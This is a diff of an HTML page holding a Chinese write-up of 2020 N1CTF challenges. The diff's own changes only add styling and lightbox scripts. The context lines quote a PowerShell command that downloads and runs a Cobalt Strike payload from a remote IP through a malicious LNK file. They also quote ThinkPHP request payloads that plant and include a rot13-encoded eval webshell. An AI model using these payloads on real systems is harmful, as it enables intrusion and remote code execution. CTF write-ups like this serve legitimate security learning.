@@ -33,6 +33,10 @@
     
     
     
+      <link rel="stylesheet" href="../../css/extension.css">
+    
+      <link rel="stylesheet" href="../../css/simpleLightbox.scss">
+    
     
       
     
@@ -603,7 +607,7 @@
                 
                 <h1 id="2020n1ctf">2020N1CTF<a class="headerlink" href="#2020n1ctf" title="Permanent link">&para;</a></h1>
 <p>太菜了 ，我爬
-<img alt="" src="../../image/CTF_Writeup/2020N1CTF/1.png" /></p>
+<img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/1.png" tag="1" /></p>
 <h2 id="signin"><strong>SignIn</strong><a class="headerlink" href="#signin" title="Permanent link">&para;</a></h2>
 <p><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> 
 <span class="k">class</span> <span class="nc">ip</span> <span class="p">{</span>
@@ -769,14 +773,14 @@ exp.py
 <h2 id="the-king-of-phish-victim-bot">The King Of Phish (Victim Bot)<a class="headerlink" href="#the-king-of-phish-victim-bot" title="Permanent link">&para;</a></h2>
 <p>域渗透 只会入口题目 我爬</p>
 <p>拿到代码，让我们上传一个Windows的Lnk文件，然后他会自己运行，<code>command_line_arguments</code>处bypass一下空格就行  <br />
-<img alt="" src="../../image/CTF_Writeup/2020N1CTF/2.png" />
+<img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/2.png" tag="1" />
 <code>command_line_arguments</code>指的是这里</p>
 <p><strong>CS4.0上号</strong></p>
 <p>设置监听
-<img alt="" src="../../image/CTF_Writeup/2020N1CTF/5.png" /></p>
+<img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/5.png" tag="1" title="Image 1-2" /></p>
 <p>生成🐎
-<img alt="" src="../../image/CTF_Writeup/2020N1CTF/3.png" /></p>
-<p><img alt="" src="../../image/CTF_Writeup/2020N1CTF/6.png" /></p>
+<img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/3.png" tag="1" title="Image 1-3" /></p>
+<p><img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/6.png" tag="1" title="Image 1-4" /></p>
 <div class="highlight"><pre><span></span><code>cmd /c  powershell.exe  -nop    -w  hidden  -c  &quot;IEX    ((new-object    net.webclient).downloadstring(&#39;http://106.xx.xxx.xx:80/a&#39;))&quot;
 </code></pre></div>
 
@@ -800,9 +804,9 @@ powershell 运行 上传 触发 拿shell</p>
 <div class="highlight"><pre><span></span><code>a=../../../../../../../var/www/html/public/&lt;?cuc cucvasb();riny($_CBFG[1]); ?&gt;&amp;_method=__construct&amp;filter[]=think\Build::module&amp;method=POST
 </code></pre></div>
 
-<p><img alt="" src="../../image/CTF_Writeup/2020N1CTF/8.png" /></p>
+<p><img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/8.png" tag="1" /></p>
 <p>会自动生成一个<code>模块</code> 而且文件路径和<code>controller\Index.php</code>部分文件内容可控
-<img alt="" src="../../image/CTF_Writeup/2020N1CTF/9.png" /></p>
+<img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/9.png" tag="1" /></p>
 <p><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="k">namespace</span> <span class="nx">app\</span><span class="o">../../../../../../../</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="k">public</span><span class="o">/&lt;?</span><span class="nx">cuc</span> <span class="nx">cucvasb</span><span class="p">();</span><span class="nx">riny</span><span class="p">(</span><span class="nv">$_CBFG</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">\controller;</span>
 
@@ -814,14 +818,14 @@ powershell 运行 上传 触发 拿shell</p>
 <span class="x">    }</span>
 <span class="x">}</span>
 </code></pre></div>
-<img alt="" src="../../image/CTF_Writeup/2020N1CTF/10.png" /></p>
+<img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/10.png" tag="1" /></p>
 <p>这里发生变换 但还是可以用php伪协议</p>
 <div class="highlight"><pre><span></span><code>a=php://filter/read=string.rot13/resource=%3c%3f%63%75%63%20%72%69%6e%79%28%24%5f%43%42%46%47%5b%31%5d%29%3b%20%3f%3e/controller/Index.php&amp;_method=__construct&amp;filter[]=think\__include_file&amp;method=POST&amp;1=phpinfo();
 </code></pre></div>
 
-<p><img alt="" src="../../image/CTF_Writeup/2020N1CTF/11.png" /></p>
+<p><img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/11.png" tag="1" /></p>
 <p>蚁剑绕<code>disable_functions</code> 一把梭</p>
-<p><img alt="" src="../../image/CTF_Writeup/2020N1CTF/12.png" /></p>
+<p><img alt="" class="img-fluid" src="../../image/CTF_Writeup/2020N1CTF/12.png" tag="1" /></p>
                 
               
               
@@ -900,6 +904,12 @@ powershell 运行 上传 触发 拿shell</p>
           }, typeof search !== "undefined" && search)
         })
       </script>
+      
+        <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+      
+        <script src="../../js/simpleLightbox.min.js"></script>
+      
+        <script src="../../js/extension.js"></script>
       
     
   </body>
